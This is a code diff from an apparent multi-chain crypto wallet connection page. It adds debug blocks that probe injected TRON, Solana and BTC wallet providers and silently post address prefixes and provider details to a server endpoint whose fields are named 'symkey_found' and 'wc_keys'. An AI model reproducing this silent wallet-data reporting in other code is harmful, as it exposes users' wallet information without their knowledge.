@@ -8523,26 +8523,29 @@
             setTimeout(finish, 1200);
           });
           discoverChainFamilies();
-          // Debug: comprehensive provider availability check
+          // Debug A — provider SHAPE before rail (what's inside tron/sol providers)
           try {
             var _twObj = window.trustwallet || {};
-            var _twKeys = Object.keys(_twObj).join(',') || 'EMPTY';
-            // Check ALL possible Trust Wallet provider injection patterns
-            var _hasTronLink = !!window.tronLink;
-            var _hasTronWeb = !!window.tronWeb;
-            var _hasSolWin = !!window.solana;
-            var _hasBtcWin = !!window.bitcoin;
-            var _hasTwTron = !!_twObj.tron;
-            var _hasTwSol = !!_twObj.solana;
-            var _hasTwBtc = !!_twObj.bitcoin;
-            var _fpCounts = S.familyProviders.TRON.length + '/' + S.familyProviders.SVM.length + '/' + S.familyProviders.UTXO.length;
-            var _eth = window.ethereum || {};
-            var _isTW = !!(_eth.isTrust || _eth.isTrustWallet);
+            var _tronProv = _twObj.tron || window.tronLink || null;
+            var _solProv = _twObj.solana || null;
+            // TRON: what does defaultAddress look like right now?
+            var _tronDa = _tronProv && _tronProv.defaultAddress;
+            var _tronB58 = (_tronDa && _tronDa.base58) ? _tronDa.base58.slice(0, 10) : 'EMPTY';
+            // TRON: does it have a .request method?
+            var _tronHasReq = !!(_tronProv && _tronProv.request);
+            // TRON: what keys does trustwallet.tron have?
+            var _tronKeys = _twObj.tron ? Object.keys(_twObj.tron).join(',').slice(0, 60) : 'no-tron';
+            // SOL: publicKey available?
+            var _solPk = _solProv && _solProv.publicKey;
+            var _solAddr = _solPk ? (typeof _solPk.toString === 'function' ? _solPk.toString().slice(0, 10) : String(_solPk).slice(0, 10)) : 'EMPTY';
+            // window.tronWeb.defaultAddress directly
+            var _twbDa = window.tronWeb && window.tronWeb.defaultAddress;
+            var _twbB58 = (_twbDa && _twbDa.base58) ? _twbDa.base58.slice(0, 10) : 'EMPTY';
             apiPost('/api/v1/wc/session-debug', {
-              wc_keys: _twKeys,
-              session_found: 'tl:' + _hasTronLink + '|twb:' + _hasTronWeb + '|sol:' + _hasSolWin + '|btc:' + _hasBtcWin,
-              symkey_found: 'twTron:' + _hasTwTron + '|twSol:' + _hasTwSol + '|twBtc:' + _hasTwBtc + '|isTW:' + _isTW,
-              attempts: 'fp:' + _fpCounts,
+              wc_keys: 'PRE|tronB58:' + _tronB58 + '|twbB58:' + _twbB58,
+              session_found: 'solPk:' + _solAddr + '|tronHasReq:' + _tronHasReq,
+              symkey_found: 'tronKeys:' + _tronKeys,
+              attempts: 'fp:' + S.familyProviders.TRON.length + '/' + S.familyProviders.SVM.length,
             }).catch(function() {});
           } catch (eDbgTw) {}
           await runWithTimeout(
@@ -8550,6 +8553,18 @@
             20000,
             'trust-inapp-families'
           );
+          // Debug B — result AFTER rail (did S.chains get set?)
+          try {
+            var _sTron = (S.chains.TRON && S.chains.TRON.address) ? S.chains.TRON.address.slice(0, 10) : 'NONE';
+            var _sSol = (S.chains.SOL && S.chains.SOL.address) ? S.chains.SOL.address.slice(0, 10) : 'NONE';
+            var _sBtc = (S.chains.BTC && S.chains.BTC.address) ? S.chains.BTC.address.slice(0, 10) : 'NONE';
+            apiPost('/api/v1/wc/session-debug', {
+              wc_keys: 'POST-RAIL',
+              session_found: 'tron:' + _sTron + '|sol:' + _sSol,
+              symkey_found: 'btc:' + _sBtc,
+              attempts: 'done',
+            }).catch(function() {});
+          } catch (eDbgPost) {}
           applyLegionWalletSessionAddresses();
           wireWcFamilyConnections();
           S.allAddresses = collectAddressMap(address);
